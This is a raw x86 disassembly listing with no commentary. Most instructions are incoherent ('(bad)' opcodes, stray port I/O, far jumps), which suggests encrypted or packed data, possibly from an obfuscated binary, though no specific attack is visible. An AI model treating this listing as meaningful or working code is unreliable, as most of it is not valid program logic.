  408ac1:	mov    edx,0x1464bb18
  408ac6:	mov    bh,0xf9
  408ac8:	dec    ecx
  408ac9:	fwait
  408aca:	or     dh,dh
  408acc:	pop    esp
  408acd:	add    DWORD PTR [eax+0x74bae108],ebx
  408ad3:	xor    bl,BYTE PTR [eax-0x71bf40be]
  408ad9:	das    
  408ada:	imul   edi,DWORD PTR [ebx],0xc5b61fb8
  408ae0:	sbb    DWORD PTR [edx],eax
  408ae2:	pop    ebp
  408ae3:	or     al,0x6b
  408ae5:	into   
  408ae6:	outs   dx,DWORD PTR ds:[esi]
  408ae7:	dec    edx
  408ae8:	jecxz  0x408aa0
  408aea:	in     eax,0x99
  408aec:	jmp    0x408ab2
  408aee:	mov    dl,0xaf
  408af0:	xor    esp,esp
  408af2:	pop    esi
  408af3:	mov    eax,0x7fb3578a
  408af8:	jns    0x408b01
  408afa:	push   ds
  408afb:	in     al,dx
  408afc:	stos   BYTE PTR es:[edi],al
  408afd:	retf   
  408afe:	mov    eax,0x1182d392
  408b03:	mov    ch,0xdb
  408b05:	out    dx,eax
  408b06:	lds    ebx,FWORD PTR [esi+eiz*4]
  408b09:	mov    ds,WORD PTR [edi-0x33]
  408b0c:	xchg   ebx,eax
  408b0d:	inc    edx
  408b0e:	ins    BYTE PTR es:[edi],dx
  408b0f:	cld    
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  408b12:	sti    
  408b13:	lods   al,BYTE PTR ds:[esi]
  408b14:	jp     0x408b02
  408b16:	mov    gs,WORD PTR [ebp+0x3f]
  408b19:	sub    DWORD PTR [bx+di-0x77],edx
  408b1d:	and    DWORD PTR ds:0xaf5248d3,edi
  408b23:	cmp    al,BYTE PTR [ebx]
  408b25:	aaa    
  408b26:	push   ebp
  408b27:	js     0x408ae6
  408b29:	mov    al,ds:0xe425088a
  408b2e:	fwait
  408b2f:	scas   eax,DWORD PTR es:[edi]
  408b30:	cdq    
  408b31:	imul   esi,DWORD PTR [ebp-0x73],0x45
  408b35:	stos   BYTE PTR es:[edi],al
  408b36:	push   eax
  408b37:	jg     0x408b05
  408b39:	mov    edi,0xc46c2b23
  408b3e:	stos   DWORD PTR es:[edi],eax
  408b3f:	sbb    al,0xde
  408b41:	sbb    dh,ch
  408b43:	sub    dh,bl
  408b45:	ficomp WORD PTR [ecx+0x35]
  408b48:	cmp    eax,0x164587f5
  408b4d:	data16 jo 0x408ae0
  408b50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b51:	(bad)  
  408b52:	push   edx
  408b53:	fisttp DWORD PTR [edi]
  408b55:	in     al,0x2e
  408b57:	out    dx,al
  408b58:	mov    eax,0x2c40ae32
  408b5d:	fld    TBYTE PTR [esi+0x7a]
  408b60:	pop    edx
  408b61:	pop    ecx
  408b62:	imul   esp,esp,0x25
  408b65:	mov    esi,DWORD PTR [ebx+edx*2+0x73]
  408b69:	cmp    BYTE PTR [ebp-0x35],ah
  408b6c:	cmp    dh,BYTE PTR [ebx-0x68866b10]
  408b72:	sub    esi,DWORD PTR [ebp+0x379f8ea9]
  408b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b79:	bound  eax,QWORD PTR [ebp+0x6c]
  408b7c:	ins    BYTE PTR es:[edi],dx
  408b7d:	mov    ebx,0x96b29579
  408b82:	nop
  408b83:	inc    edx
  408b84:	daa    
  408b85:	jl     0x408c06
  408b87:	push   es
  408b88:	xchg   edx,eax
  408b89:	imul   esp,DWORD PTR [ebx],0xef001645
  408b8f:	pop    es
  408b90:	mov    ds:0x98741729,al
  408b95:	and    DWORD PTR [edi-0x7ef769d8],ebp
  408b9b:	dec    ebp
  408b9c:	xor    al,cl
  408b9e:	dec    esp
  408b9f:	or     esi,DWORD PTR [ebp-0x14af81f1]
  408ba5:	xchg   esi,eax
  408ba6:	(bad)  
  408ba7:	or     BYTE PTR [edi-0x16cec71],bl
  408bad:	mov    bl,0x33
  408baf:	mov    eax,ds:0x3e907c52
  408bb4:	xchg   edi,eax
  408bb5:	mov    eax,0xf6442f8b
  408bba:	dec    edx
  408bbb:	mov    ebx,0x6ae18b6d
  408bc0:	bound  edi,QWORD PTR ds:0x7a853f66
  408bc6:	out    dx,al
  408bc7:	mov    eax,ds:0x52696159
  408bcc:	mov    al,0xf4
  408bce:	jg     0x408bfd
  408bd0:	or     eax,0x7242bf2a
  408bd5:	xor    DWORD PTR [ebp+esi*2+0x5f],ecx
  408bd9:	mov    ecx,0x6e90120c
  408bde:	retf   0x4438
  408be1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  408be3:	cmp    eax,0xd598079a
  408be8:	adc    al,0xaf
  408bea:	aaa    
  408beb:	(bad)  
  408bec:	test   eax,0xd46e0362
  408bf1:	call   0xd299:0x5fd7fe4
  408bf8:	(bad)  [ebp+0x40ecfc1c]
  408bfe:	jp     0x408c1b
  408c00:	xchg   ecx,eax
  408c01:	pop    ds
  408c02:	xchg   edx,eax
  408c03:	call   0x91e1361
  408c08:	cli    
  408c09:	mov    edx,0x5cdc0747
  408c0e:	loopne 0x408baf
  408c10:	ds loopne 0x408ba8
  408c13:	jne    0x408bf2
  408c15:	push   eax
  408c16:	mov    al,ds:0x12aaaea
  408c1b:	mov    edx,DWORD PTR [edi]
  408c1d:	pop    edx
  408c1e:	out    dx,al
  408c1f:	rcr    BYTE PTR [edx],0xe1
  408c22:	mov    dh,BYTE PTR [edx]
  408c24:	ret    0x1dce
  408c27:	push   ebp
  408c28:	cwde   
  408c29:	aad    0xb6
  408c2b:	mov    al,0xe
  408c2d:	fs mov bh,bh
  408c30:	inc    ebp
  408c31:	cmp    BYTE PTR [esi-0x8],dl
  408c34:	ss call 0x210:0xda515066
  408c3c:	sub    eax,DWORD PTR [ebx+0x1d30f7d0]
  408c42:	loop   0x408c56
  408c44:	retf   0xbc10
  408c47:	pop    ecx
  408c48:	dec    ecx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  esp,QWORD PTR [ebx+0x6e]
  408c72:	dec    eax
  408c73:	push   0x47
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c78
  408c7d:	or     esp,DWORD PTR [eax]
  408c7f:	in     al,dx
  408c80:	test   BYTE PTR [ecx-0x1bba71fc],0xf9
  408c87:	inc    edx
  408c88:	jecxz  0x408cc6
  408c8a:	and    eax,0x9a4a73a6
  408c8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c90:	jp     0x408c2a
  408c92:	jl     0x408cec
  408c94:	pop    es
  408c95:	add    cl,BYTE PTR [eax]
  408c97:	(bad)  
  408c98:	sub    bl,dh
  408c9a:	lods   al,BYTE PTR ds:[esi]
  408c9b:	mov    esi,esi
  408c9d:	in     eax,dx
  408c9e:	mov    ds:0x1442e545,al
  408ca3:	mov    eax,ds:0x843424b8
  408ca8:	out    0xe4,eax
  408caa:	sub    eax,0xd29e14cd
  408caf:	div    DWORD PTR [edi]
  408cb1:	lock imul eax,DWORD PTR [ebx+ebp*4-0x5e],0xffffffb2
  408cb7:	das    
  408cb8:	daa    
  408cb9:	pop    esp
  408cba:	leave  
  408cbb:	ds inc eax
  408cbd:	jmp    0x8872:0x3e527fe0
  408cc4:	aaa    
  408cc5:	(bad)  
  408cc6:	mov    DWORD PTR [edx+0x42],edx
  408cc9:	clc    
  408cca:	add    DWORD PTR [edi+ecx*4+0x62494085],ebx
  408cd1:	adc    eax,0x775f7543
  408cd6:	(bad)  
  408cd7:	sbb    eax,0xbb213118
  408cdc:	mov    al,ds:0xdb065934
  408ce1:	lds    edi,FWORD PTR [esi+0x4993533e]
  408ce7:	mov    al,0xc8
  408ce9:	dec    ebp
  408cea:	lock div ch
  408ced:	stos   BYTE PTR es:[edi],al
  408cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cef:	pushf  
  408cf0:	or     eax,0xd8e087b3
  408cf5:	pop    ebp
  408cf6:	lock aas 
  408cf8:	adc    al,0xef
  408cfa:	dec    eax
  408cfb:	enter  0x9137,0x48
  408cff:	xchg   edi,eax
  408d00:	or     ecx,ebx
  408d02:	enter  0x10d4,0x44
  408d06:	dec    edx
  408d07:	add    eax,0x294a329f
  408d0c:	mov    DWORD PTR [ebp-0x35],edi
  408d0f:	gs repz sub al,0xf6
  408d13:	pushf  
  408d14:	jae    0x408d38
  408d16:	jne    0x408d96
  408d18:	bound  ebx,QWORD PTR [ecx-0x78de9787]
  408d1e:	ins    BYTE PTR es:[edi],dx
  408d1f:	dec    ebx
  408d20:	enter  0x2749,0xca
  408d24:	push   edi
  408d25:	and    DWORD PTR [ecx-0x70cef6bf],ebx
  408d2b:	sub    BYTE PTR [ebp+0x14],0x5c
  408d2f:	mov    esp,0xfe6d438e
  408d34:	rcr    al,cl
  408d36:	dec    esp
  408d37:	inc    ebp
  408d38:	pop    es
  408d39:	mov    ebp,0x45bcba5d
  408d3e:	addr16 sbb eax,0xb81483f0
  408d44:	lods   al,BYTE PTR ds:[esi]
  408d45:	pop    edi
  408d46:	jns    0x408d8c
  408d48:	pop    ebx
  408d49:	dec    edi
  408d4a:	jmp    0x408d25
  408d4c:	cmp    al,0xb4
  408d4e:	mov    ch,0xf6
  408d50:	test   eax,0x3c2150fc
  408d55:	jmp    0xb371:0x82b0a9aa
  408d5c:	mov    edi,0xe2c10ddd
  408d61:	cmovnp edi,ebx
  408d64:	aas    
  408d65:	jle    0x408dca
  408d67:	pusha  
  408d68:	cdq    
  408d69:	sbb    dh,BYTE PTR [edx+0x13e21dbf]
  408d6f:	imul   esi,eax,0x8b6ba19c
  408d75:	mov    esi,0x52c757e3
  408d7a:	icebp  
  408d7b:	in     eax,0x2d
  408d7d:	pushf  
  408d7e:	and    al,BYTE PTR [edx-0x3111eec9]
  408d84:	mov    esi,0xe144177d
  408d89:	mov    eax,0xd5565b59
  408d8e:	push   edi
  408d8f:	xlat   BYTE PTR ds:[ebx]
  408d90:	leave  
  408d91:	gs in  eax,dx
  408d93:	hlt    
  408d94:	iret   
  408d95:	retf   0x8f01
  408d98:	cmp    esp,eax
  408d9a:	push   ss
  408d9b:	mov    ds:0xdc3c364a,al
  408da0:	and    eax,0xf567d6b
  408da5:	inc    esi
  408da6:	xor    BYTE PTR [edi+0x3d0a65fe],dh
  408dac:	lods   eax,DWORD PTR cs:[esi]
  408dae:	shl    ecx,0x96
  408db1:	jmp    0x624cce8a
  408db6:	mov    ds:0x1952a593,eax
  408dbb:	or     BYTE PTR [ebx-0x4de97eef],0x14
  408dc2:	gs loop 0x408d59
  408dc5:	and    dh,ah
  408dc7:	cmp    DWORD PTR [ecx],esi
  408dc9:	xchg   ebx,eax
  408dca:	mov    ebx,0xb8cf59db
  408dcf:	xchg   ebx,eax
  408dd0:	ins    BYTE PTR es:[edi],dx
  408dd1:	jmp    0x5920:0xa64249f9
  408dd8:	call   0x27df:0xff2f98b5
  408ddf:	cs sbb al,0xf0
  408de2:	and    al,0x43
  408de4:	xchg   BYTE PTR [ebx-0x4043ef67],dh
  408dea:	dec    esi
  408deb:	dec    ebp
  408dec:	imul   esp,DWORD PTR [edi+0x66],0xffffff88
  408df0:	mov    bh,0xa5
  408df2:	lods   al,BYTE PTR ds:[esi]
  408df3:	mov    esp,0x1e5663b1
  408df8:	mov    edi,0x6b3901e2
  408dfd:	mov    esi,0x3fd5d55c
  408e02:	test   DWORD PTR [eax+0x69],ebx
  408e05:	or     BYTE PTR [ebp+0x5f],0x61
  408e09:	xchg   edi,eax
  408e0a:	fsub   DWORD PTR [edx+0x21ead390]
  408e10:	retf   
  408e11:	imul   BYTE PTR [edx+0x12]
  408e14:	or     ebp,DWORD PTR [esp+eiz*2]
  408e17:	or     ch,BYTE PTR [esi]
  408e19:	pop    ecx
  408e1a:	inc    edi
  408e1b:	dec    ecx
  408e1c:	pop    edi
  408e1d:	lea    eax,[ebp-0x59]
  408e20:	xor    eax,0xee2ec63a
  408e25:	xchg   ebx,eax
  408e26:	(bad)  
  408e27:	in     al,dx
  408e28:	dec    ebx
  408e29:	sbb    al,BYTE PTR [edi+ebp*1-0x6c03a9da]
  408e30:	cdq    
  408e31:	pop    ecx
  408e32:	or     BYTE PTR [edx+0x5919d26d],bl
  408e38:	jnp    0x408e56
  408e3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e3b:	mov    ebp,0xa5bfc38a
  408e40:	imul   eax,DWORD PTR ds:0xc0d9e308,0xf80744ff
  408e4a:	jo     0x408e1f
  408e4c:	xchg   esi,eax
  408e4d:	lds    esp,FWORD PTR [ebx+0x250107f]
  408e53:	repnz out dx,eax
  408e55:	lahf   
  408e56:	scas   al,BYTE PTR es:[edi]
  408e57:	add    DWORD PTR [esi-0x4d2207d2],eax
  408e5d:	jo     0x408ed0
  408e5f:	push   cs
  408e60:	dec    ebp
  408e61:	in     al,0x5f
  408e63:	lods   al,BYTE PTR ds:[esi]
  408e64:	and    DWORD PTR ds:0x45a422b4,0x151b0dd9
  408e6e:	add    al,0xaa
  408e70:	(bad)  
  408e71:	pop    ss
  408e72:	mov    bl,0x76
  408e74:	cwde   
  408e75:	sbb    bl,BYTE PTR [ebx-0x18ee8c65]
  408e7b:	jne    0x408ea8
  408e7d:	mov    ebp,0x15af16
  408e82:	pop    edx
  408e83:	stos   DWORD PTR es:[edi],eax
  408e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e85:	mov    edx,DWORD PTR [ecx+0x2e0ccde9]
  408e8b:	div    bh
  408e8d:	xor    eax,0xe6f2abd0
  408e92:	inc    ebp
  408e93:	mov    eax,0x6a3b411a
  408e98:	in     al,dx
  408e99:	sar    DWORD PTR [ebx],1
  408e9b:	jmp    0x408e6f
  408e9d:	shl    ebx,0xeb
  408ea0:	xchg   ebx,eax
  408ea1:	jmp    0x32d3:0x487acca0
  408ea8:	outs   dx,DWORD PTR ds:[esi]
  408ea9:	fdivr  QWORD PTR [ecx]
  408eab:	pop    ds
  408eac:	inc    ebp
  408ead:	xchg   DWORD PTR [ebx-0x19a30a03],ecx
  408eb3:	cs fcmovb st,st(5)
  408eb7:	or     DWORD PTR [ebx],edi
  408eb9:	sbb    al,0xd0
  408ebb:	or     eax,0x33986ae4
  408ec0:	shl    DWORD PTR [esi+0x2f972647],cl
  408ec6:	dec    eax
  408ec7:	xchg   DWORD PTR [eax],ecx
  408ec9:	pop    esi
  408eca:	dec    ecx
  408ecb:	xchg   esi,eax
  408ecc:	cmc    
  408ecd:	stc    
  408ece:	pop    ds
  408ecf:	es lock mov edx,esi
  408ed3:	out    dx,al
  408ed4:	inc    edx
  408ed5:	call   0xe719:0xd82fc878
  408edc:	and    BYTE PTR [ebp-0x18],dh
  408edf:	icebp  
  408ee0:	mov    ebx,0x26b069e3
  408ee5:	sub    al,0xf
  408ee7:	popa   
  408ee8:	lahf   
  408ee9:	scas   al,BYTE PTR es:[edi]
  408eea:	xchg   esp,eax
  408eeb:	jge    0x408ece
  408eed:	mov    ss,WORD PTR [ecx+0x70901b06]
  408ef3:	in     eax,dx
  408ef4:	add    al,0xe
  408ef6:	pop    ecx
  408ef7:	push   edx
  408ef8:	pop    ecx
  408ef9:	das    
  408efa:	and    eax,0x7f5bbe82
  408eff:	scas   eax,DWORD PTR es:[edi]
  408f00:	rol    DWORD PTR [ebx+esi*1+0x44afb75b],cl
  408f07:	sahf   
  408f08:	mov    eax,ds:0xb6246234
  408f0d:	pop    ecx
  408f0e:	pop    edx
  408f0f:	(bad)  
  408f10:	cmc    
  408f11:	mov    eax,0xcbf99ef0
  408f16:	dec    edi
  408f17:	arpl   WORD PTR [esp+eax*4+0x61],bx
  408f1b:	fwait
  408f1c:	lahf   
  408f1d:	nop
  408f1e:	jmp    0x7f08:0x9b2f6c1
  408f25:	test   DWORD PTR [ecx],ebp
  408f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f28:	test   DWORD PTR [eax+0x4ab33339],0x79f2783c
  408f32:	push   edi
  408f33:	or     eax,0x4c8ac689
  408f38:	js     0x408ee9
  408f3a:	inc    ebp
  408f3b:	shl    DWORD PTR [eax],1
  408f3d:	fist   WORD PTR [ebx-0x796ea774]
  408f43:	ds cdq 
  408f45:	lods   al,BYTE PTR ds:[esi]
  408f46:	scas   eax,DWORD PTR es:[edi]
  408f47:	iret   
  408f48:	aas    
  408f49:	scas   al,BYTE PTR es:[edi]
  408f4a:	jmp    DWORD PTR [eax+0x7f]
  408f4d:	pop    edx
  408f4e:	ret    0x3f68
  408f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f53:	mov    edi,0x99152d9f
  408f58:	out    dx,al
  408f59:	outs   dx,DWORD PTR ds:[esi]
  408f5a:	rcl    BYTE PTR [edi+0x28],cl
  408f5d:	mov    dl,0x2e
  408f5f:	sbb    al,0x82
  408f61:	xchg   BYTE PTR [ebx],ah
  408f63:	ret    
  408f64:	rol    BYTE PTR [edi+edi*8+0x1ba2813a],1
  408f6b:	adc    al,0x4b
  408f6d:	outs   dx,DWORD PTR ds:[esi]
  408f6e:	adc    DWORD PTR [edi-0x38],edx
  408f71:	mov    al,0x58
  408f73:	lds    edi,FWORD PTR [edx-0x28ae569b]
  408f79:	cmp    al,0x97
  408f7b:	dec    esp
  408f7c:	addr16 ret 0xa005
  408f80:	push   esp
  408f81:	pop    ds
  408f82:	out    0x2,eax
  408f84:	clc    
  408f85:	aaa    
  408f86:	pusha  
  408f87:	mov    eax,ds:0x20670809
  408f8c:	xor    al,0x33
  408f8e:	retf   0x121b
  408f91:	jg     0x409001
  408f93:	jle    0x408f3b
  408f95:	push   0xaf105094
  408f9a:	xor    eax,0x9461149a
  408f9f:	fwait
  408fa0:	nop
  408fa1:	and    DWORD PTR [esi-0xb9b37af],ecx
  408fa7:	mov    al,ds:0xd5c98e6e
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x1a1937f3
  408fc6:	xchg   ecx,eax
  408fc7:	xor    edi,ebp
  408fc9:	ja     0x408fb1
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x408fa5
  408fd2:	mov    bh,0xf
  408fd4:	je     0x408f77
  408fd6:	pop    eax
  408fd7:	scas   al,BYTE PTR es:[edi]
  408fd8:	push   ebp
  408fd9:	in     al,dx
  408fda:	sub    DWORD PTR [esi-0x46749833],ecx
  408fe0:	mov    BYTE PTR [ecx+esi*1-0x4c5a2b45],dl
  408fe7:	lahf   
  408fe8:	call   0x420f8b1f
  408fed:	jae    0x409009
  408fef:	mov    esp,edx
  408ff1:	aam    0x46
  408ff3:	sub    BYTE PTR [esi-0x157f5327],cl
  408ff9:	mov    bl,0xe
  408ffb:	retf   
  408ffc:	add    cl,bl
  408ffe:	inc    edi
  408fff:	mov    bh,0x25
  409001:	xor    al,BYTE PTR [ebx-0x8f12729]
  409007:	(bad)  
  409008:	fld    QWORD PTR [ebp+ebx*4-0x39550d47]
  40900f:	test   DWORD PTR [eax-0x1a],edx
  409012:	jl     0x40905a
  409014:	shl    DWORD PTR [ebx+0xf6d13d2],cl
  40901a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40901b:	mov    dl,0x91
  40901d:	xor    eax,0xab323bcd
  409022:	adc    BYTE PTR [edi+0x10ebef84],bh
  409028:	addr16 dec eax
  40902a:	std    
  40902b:	push   eax
  40902c:	in     eax,0x30
  40902e:	pop    ds
  40902f:	mov    esp,0x692e0b4d
  409034:	fidiv  DWORD PTR [edx+0x62]
  409037:	jmp    0x409095
  409039:	(bad)  
  40903a:	enter  0x1485,0x31
  40903e:	retf   0xd3b1
  409041:	sahf   
  409042:	or     edi,DWORD PTR [ecx]
  409044:	push   ecx
  409045:	stc    
  409046:	push   ebx
  409047:	popf   
  409048:	jbe    0x408fe2
  40904a:	ret    0xa728
  40904d:	(bad)  
  40904e:	out    0x8,eax
  409050:	dec    ebx
  409051:	aad    0x1b
  409053:	and    DWORD PTR [ebp+0x7b],edi
  409056:	outs   dx,BYTE PTR ds:[esi]
  409057:	test   eax,0xb8815006
  40905c:	and    eax,esi
  40905e:	mov    esp,0x51104068
  409063:	test   BYTE PTR ds:[ebx],ah
  409066:	jl     0x40906f
  409068:	inc    edi
  409069:	in     al,0xe0
  40906b:	inc    esp
  40906c:	sbb    edx,DWORD PTR [ebx-0x4e]
  40906f:	adc    cl,BYTE PTR [ebp+0x7d]
  409072:	xor    al,0x1
  409074:	xchg   edi,eax
  409075:	push   0x2a1fd3d
  40907a:	pop    ds
  40907b:	xchg   ebp,eax
  40907c:	push   esp
  40907d:	cdq    
  40907e:	es ins DWORD PTR es:[edi],dx
  409080:	mov    esi,0x6bb1fe54
  409085:	xchg   DWORD PTR [ebp+0x7f728691],edx
  40908b:	fs push esp
  40908d:	outs   dx,BYTE PTR ds:[esi]
  40908e:	fdiv   st(1),st
  409090:	pop    ebp
  409091:	jp     0x4090af
  409093:	imul   esp,DWORD PTR [ebx],0xfffffff1
  409096:	scas   al,BYTE PTR es:[edi]
  409097:	and    bh,dh
  409099:	inc    eax
  40909a:	xor    al,0x2a
  40909c:	cwde   
  40909d:	jns    0x4090ef
  40909f:	mov    dl,BYTE PTR [ecx+0x37f4160f]
  4090a5:	sbb    al,0x39
  4090a7:	xchg   edi,eax
  4090a8:	pop    esp
  4090a9:	test   al,0x90
  4090ab:	pop    esp
  4090ac:	ret    
  4090ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090ae:	sub    BYTE PTR [edx+0x15],ah
  4090b1:	popf   
  4090b2:	inc    esp
  4090b3:	pop    ecx
  4090b4:	push   eax
  4090b5:	adc    esp,0x7ba1d5e9
  4090bb:	or     cl,BYTE PTR [edx-0x7a]
  4090be:	sub    eax,0x38b908d6
  4090c3:	iret   
  4090c4:	add    bl,BYTE PTR [ecx+eax*1+0x61d8d478]
  4090cb:	push   ebx
  4090cc:	pop    esi
  4090cd:	fisttp DWORD PTR [esi+0x594784d5]
  4090d3:	cdq    
  4090d4:	inc    eax
  4090d5:	(bad)  
  4090d6:	mov    dh,0x35
  4090d8:	add    al,0xb2
  4090da:	jo     0x40914c
  4090dc:	mov    eax,ds:0x29371ce4
  4090e1:	loop   0x409135
  4090e3:	ret    0x8f92
  4090e6:	add    DWORD PTR [ecx+eax*1],edx
  4090e9:	add    al,0xfb
  4090eb:	cmp    ah,BYTE PTR [edx]
  4090ed:	xchg   esi,eax
  4090ee:	xchg   DWORD PTR [ebp+0xc],esp
  4090f1:	pop    ebx
  4090f2:	outs   dx,BYTE PTR ds:[esi]
  4090f3:	and    DWORD PTR [edx-0x2fa7bacd],0x5896e8df
  4090fd:	shl    edi,cl
  4090ff:	das    
  409100:	jle    0x4090cd
  409102:	cwde   
  409103:	cdq    
  409104:	add    ch,BYTE PTR [edi-0x6e]
  409107:	hlt    
  409108:	pop    esp
  409109:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40910a:	mov    dl,0x97
  40910c:	jne    0x409128
  40910e:	mov    ch,0x1d
  409110:	dec    eax
  409111:	sub    BYTE PTR [bp+0x38e7],al
  409116:	push   edi
  409117:	mov    ecx,0xe7768897
  40911c:	inc    ecx
  40911d:	out    0x38,al
  40911f:	pop    ecx
  409120:	xchg   DWORD PTR [ecx+edx*4],edx
  409123:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409125:	push   ecx
  409126:	test   BYTE PTR [ecx+edi*1+0x4],cl
  40912a:	ficom  DWORD PTR [edx-0x62]
  40912d:	sbb    eax,0xfaebf17
  409132:	aas    
  409133:	test   al,0xb7
  409135:	add    BYTE PTR [ebx-0x7f],bh
  409138:	(bad)  
  409139:	cmp    ch,BYTE PTR [edx-0x15d9705d]
  40913f:	in     eax,dx
  409140:	dec    esp
  409141:	ins    BYTE PTR es:[edi],dx
  409142:	and    edi,esi
  409144:	cmp    al,0xef
  409146:	mov    ds:0x454a00f3,al
  40914b:	out    0xae,al
  40914d:	sbb    eax,0xd0535fb7
  409152:	mov    esi,0x29b55453
  409157:	addr16 xor edx,ebp
  40915a:	dec    edx
  40915b:	jge    0x4090ee
  40915d:	mul    BYTE PTR [ebp-0x7a3618af]
  409163:	cmp    edx,DWORD PTR [ebx+ebx*1]
  409166:	arpl   WORD PTR [esi+esi*1-0x4ab0c069],bx
  40916d:	jmp    0xde00:0xca0ad0a9
  409174:	in     al,0xfa
  409176:	mov    BYTE PTR [eax-0x3f],ch
  409179:	or     eax,0xd95604a2
  40917e:	dec    ebp
  40917f:	xchg   ch,bh
  409181:	fidivr DWORD PTR ds:0x657c158a
  409187:	cwde   
  409188:	std    
  409189:	out    0x35,eax
  40918b:	stc    
  40918c:	mov    ah,0x78
  40918e:	(bad)  [edi+0x4d]
  409191:	mov    dl,0xae
  409193:	fdivr  QWORD PTR [esi-0x46df8739]
  409199:	dec    edx
  40919a:	repz into 
  40919c:	retf   0x35f8
  40919f:	mov    bl,BYTE PTR [edi]
  4091a1:	je     0x409211
  4091a3:	mov    ebx,DWORD PTR [ebp+0x46593cf4]
  4091a9:	ret    
  4091aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091ab:	mov    esp,0x26fa214f
  4091b0:	cli    
  4091b1:	inc    ecx
  4091b2:	jp     0x4091c1
  4091b4:	int    0xed
  4091b6:	mov    edx,gs
  4091b8:	pushf  
  4091b9:	loopne 0x409180
  4091bb:	mov    ch,0x30
  4091bd:	out    dx,al
  4091be:	jmp    FWORD PTR [ecx]
  4091c0:	and    cl,BYTE PTR [ebx]
  4091c2:	mov    ebx,0x7ad9fda3
  4091c7:	int3   
  4091c8:	and    eax,eax
  4091ca:	adc    dh,dl
  4091cc:	and    BYTE PTR [edi+0xf],ch
  4091cf:	fld1   
  4091d1:	inc    ebp
  4091d2:	out    0xe4,eax
  4091d4:	push   edi
  4091d5:	dec    esp
  4091d6:	dec    esi
  4091d7:	cmp    eax,0x127c2b60
  4091dc:	inc    edx
  4091dd:	(bad)  
  4091de:	fdivr  st(7),st
  4091e0:	fs jp  0x4091e2
  4091e3:	into   
  4091e4:	pop    eax
  4091e5:	mov    al,0xb3
  4091e7:	pop    es
  4091e8:	add    dl,dh
  4091ea:	jns    0x4091d6
  4091ec:	add    BYTE PTR [ebx+edx*2-0x22],al
  4091f0:	rcl    BYTE PTR [ebx+edx*4-0x4be32fe4],0x32
  4091f8:	add    eax,0x3176b215
  4091fd:	test   DWORD PTR [eax-0x13],esi
  409200:	add    DWORD PTR [edi*2-0x5ac3e727],ecx
  409207:	mov    bl,0xdb
  409209:	stc    
  40920a:	and    BYTE PTR [edx+0x15],al
  40920d:	neg    ah
  40920f:	repz pop edi
  409211:	jo     0x409285
  409213:	addr16 push esp
  409215:	in     eax,dx
  409216:	inc    esp
  409217:	mov    dl,0x28
  409219:	ds ds push es
  40921c:	sti    
  40921d:	xchg   BYTE PTR [esi-0x61],al
  409220:	pusha  
  409221:	jae    0x4091e9
  409223:	rcr    BYTE PTR [esi+ebp*4-0x36],0x9b
  409228:	popa   
  409229:	fadd   st,st(3)
  40922b:	dec    ax
  40922d:	mov    ah,0x7e
  40922f:	pop    esi
  409230:	inc    ebx
  409231:	hlt    
  409232:	es aas 
  409234:	lods   eax,DWORD PTR ds:[esi]
  409235:	xchg   edi,eax
  409236:	mov    ecx,0xf5fc8fc6
  40923b:	loope  0x409234
  40923d:	sbb    DWORD PTR [ebx-0x46],ebp
  409240:	dec    edi
  409241:	xor    ebx,DWORD PTR [edi+0x43]
  409244:	mov    ecx,0xf3b89057
  409249:	pop    esp
  40924a:	aad    0x73
  40924c:	inc    esp
  40924d:	mov    ebp,0x2b6ab79d
  409252:	pop    ds
  409253:	ret    
  409254:	jmp    0xcc4e:0xea5f9bd4
  40925b:	test   DWORD PTR [edi-0x12],esp
  40925e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40925f:	sub    al,BYTE PTR [ebp+esi*4+0x5f]
  409263:	(bad)  
  409264:	cwde   
  409265:	in     eax,dx
  409266:	push   esp
  409267:	fwait
  409268:	push   ebx
  409269:	cmp    al,0x20
  40926b:	stos   DWORD PTR es:[edi],eax
  40926c:	or     DWORD PTR [esi-0x7896c943],eax
  409272:	std    
  409273:	mov    esi,0xe0ac4c77
  409278:	sub    DWORD PTR [eax+0x7fb65660],edi
  40927e:	test   al,0xf0
  409280:	lahf   
  409281:	xchg   esp,eax
  409282:	sbb    edx,DWORD PTR [esi+0x76]
  409285:	or     DWORD PTR [ebx-0x27],0xfffffffe
  409289:	xor    cl,BYTE PTR [edx+0x38c71b1]
  40928f:	cmp    bl,BYTE PTR [ebx-0x59250b1]
  409295:	mov    ebx,0xcff3bf12
  40929a:	push   0xffffffff
  40929c:	int3   
  40929d:	xor    eax,0x20b2678f
  4092a2:	push   DWORD PTR [edi]
  4092a4:	lea    eax,[edi-0x4f]
  4092a7:	outs   dx,DWORD PTR ds:[esi]
  4092a8:	enter  0x2299,0xdc
